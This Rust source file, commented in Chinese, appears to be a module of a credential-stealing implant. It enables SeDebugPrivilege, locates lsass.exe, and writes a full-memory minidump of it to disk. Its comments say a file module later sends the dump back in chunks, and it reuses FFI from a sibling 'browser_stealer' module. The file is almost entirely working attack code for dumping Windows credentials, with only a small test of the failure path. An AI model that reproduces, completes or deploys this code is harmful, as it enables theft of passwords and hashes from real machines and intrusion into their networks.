//! LSASS 内存转储：提 SeDebugPrivilege → 按名定位 lsass.exe → MiniDumpWriteDump。
//! 转储文件落盘后由文件模块分块回传。需要 SYSTEM 或 SeDebugPrivilege 权限。
//!
//! 共享的 kernel32/advapi32 FFI 复用 `browser_stealer::browser_ffi`，避免重复声明。

#![allow(non_snake_case)]
// 本模块依赖 Windows 专属 FFI（browser_stealer::browser_ffi 为 Windows-only），
// 非 Windows 平台不编译（creds lib.rs 已按平台门控）。
#![cfg(target_os = "windows")]

use std::ffi::c_void;

use crate::browser_stealer::browser_ffi::{
    self, PROCESSENTRY32W, TOKEN_PRIVILEGES,
};

const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const TOKEN_QUERY: u32 = 0x0008;
const SE_PRIVILEGE_ENABLED: u32 = 0x2;
const GENERIC_WRITE: u32 = 0x4000_0000;
const CREATE_ALWAYS: u32 = 2;
const MINIDUMP_WITH_FULL_MEMORY: u32 = 0x2;
const TH32CS_SNAPPROCESS: u32 = 0x2;
const INVALID_HANDLE: isize = -1;

#[link(name = "kernel32")]
extern "system" {
    fn CreateFileW(
        name: *const u16, access: u32, share: u32, sec: *mut c_void,
        disp: u32, flags: u32, tmpl: *mut c_void,
    ) -> isize;
}

#[link(name = "dbghelp")]
extern "system" {
    fn MiniDumpWriteDump(
        process: isize, pid: u32, file: isize, kind: u32,
        exc: *mut c_void, user: *mut c_void, callback: *mut c_void,
    ) -> i32;
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// 提 SeDebugPrivilege。
unsafe fn enable_se_debug() {
    let mut token: isize = 0;
    if browser_ffi::OpenProcessToken(browser_ffi::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) == 0 {
        return;
    }
    let name = wide("SeDebugPrivilege");
    let mut luid: i64 = 0;
    if browser_ffi::LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) != 0 {
        let tp = TOKEN_PRIVILEGES { PrivilegeCount: 1, Luid: luid, Attributes: SE_PRIVILEGE_ENABLED };
        let _ = browser_ffi::AdjustTokenPrivileges(
            token, 0, &tp as *const TOKEN_PRIVILEGES, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            std::ptr::null_mut(), std::ptr::null_mut(),
        );
    }
    browser_ffi::CloseHandle(token);
}

/// 按进程名查找 PID。
unsafe fn find_pid_by_name(name: &str) -> Option<u32> {
    let snap = browser_ffi::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE {
        return None;
    }

    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
    let mut found = None;

    if browser_ffi::Process32FirstW(snap, &mut entry) != 0 {
        loop {
            let exe = String::from_utf16_lossy(&entry.szExeFile);
            if exe.trim_end_matches('\0').eq_ignore_ascii_case(name) {
                found = Some(entry.th32ProcessID);
                break;
            }
            if browser_ffi::Process32NextW(snap, &mut entry) == 0 {
                break;
            }
        }
    }
    browser_ffi::CloseHandle(snap);
    found
}

/// 转储 LSASS 到 `dump_path`，返回 JSON。
pub fn dump_lsass(dump_path: &str) -> String {
    unsafe {
        enable_se_debug();

        let pid = match find_pid_by_name("lsass.exe") {
            Some(p) => p,
            None => return r#"{"success":false,"error":"lsass.exe not found"}"#.to_string(),
        };

        let process = browser_ffi::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process == 0 {
            return r#"{"success":false,"error":"OpenProcess(lsass) failed — need SeDebugPrivilege/SYSTEM"}"#.to_string();
        }

        let path_w = wide(dump_path);
        let file = CreateFileW(
            path_w.as_ptr(), GENERIC_WRITE, 0, std::ptr::null_mut(), CREATE_ALWAYS, 0, std::ptr::null_mut(),
        );
        if file == INVALID_HANDLE {
            browser_ffi::CloseHandle(process);
            return r#"{"success":false,"error":"CreateFile failed"}"#.to_string();
        }

        let ok = MiniDumpWriteDump(
            process, pid, file, MINIDUMP_WITH_FULL_MEMORY,
            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
        );
        browser_ffi::CloseHandle(file);
        browser_ffi::CloseHandle(process);

        if ok == 0 {
            return r#"{"success":false,"error":"MiniDumpWriteDump failed"}"#.to_string();
        }
        serde_json::json!({ "success": true, "path": dump_path, "pid": pid }).to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dump_returns_json_without_crash() {
        // 普通权限下 lsass 通常无法打开，验证失败路径不崩溃且返回合法 JSON。
        let r = dump_lsass("C:\\Users\\Public\\lsass_test.dmp");
        assert!(r.starts_with('{'), "expected JSON, got: {r}");
    }
}
